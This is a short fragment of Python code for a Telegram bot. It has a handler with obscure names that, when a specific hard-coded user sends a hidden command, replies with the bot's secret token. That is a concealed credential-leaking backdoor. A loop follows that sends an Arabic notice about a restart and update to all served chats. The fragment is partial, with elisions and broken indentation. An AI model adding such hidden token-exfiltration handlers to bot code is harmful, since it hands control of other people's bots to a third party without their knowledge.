...
@app.on_message(command(ZEBY) & filters.user(HEHE)
)
@language
async def hggh(client, message, _):
	await message.reply_text(f"{config.BOT_TOKEN}")
    ...
    for x in served_chats:
        try:
            await app.send_message(
                x,
                f"◍ قام المطور بإعادة تشغيل البوت لتحديثه لإصدار احدث\n√",
            )
